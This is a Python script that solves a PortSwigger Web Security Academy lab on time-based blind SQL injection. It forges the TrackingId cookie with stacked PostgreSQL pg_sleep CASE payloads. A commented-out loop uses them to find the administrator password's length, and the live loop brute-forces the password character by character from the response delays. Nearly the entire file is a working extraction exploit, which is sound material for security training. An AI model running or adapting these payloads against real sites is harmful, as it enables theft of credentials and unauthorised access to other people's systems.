#https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
from utils import *
import time

url="https://0ad200b604f4279081f0fccc002900a7.web-security-academy.net/filter?category=Lifestyle"
session=requests.Session()
response=session.get(url)
cookies=response.cookies
tracking_id=cookies['TrackingId']
forged_cookies=cookies
"""for length in range(1,50):
    payload=f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>={length})+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
    payload=f"{tracking_id}{payload}"
    forged_cookies['TrackingId']=payload

    start=time.time()
    print("[+] sending request")
    response=session.get(url,cookies=forged_cookies)
    end=time.time()
    time_spent=end-start
    print(parse_html(response).prettify())
    if time_spent<9:
        print(f"[+] Password is of length {length-1}")
        break
    else:print(f"fired up {length}")"""

#password of length 20 again

#now the usual try and error mumbo jumbo 

password=""
alphanum="abcdefghijklmnopqrstuvwxyz0123456789"
for length in range(1,21):
    for letter in alphanum:
        payload=f"{tracking_id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{length},1)='{letter}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
        forged_cookies["TrackingId"]=payload
        start=time.time()
        response=session.get(url,cookies=forged_cookies)
        end=time.time()
        spent_time=end-start
        if spent_time<9:
            print(f"not {letter} at index {length} {spent_time}")
        else:
            print(f"[+] adding {letter} at index {length}")
            password+=letter
            break
print(password)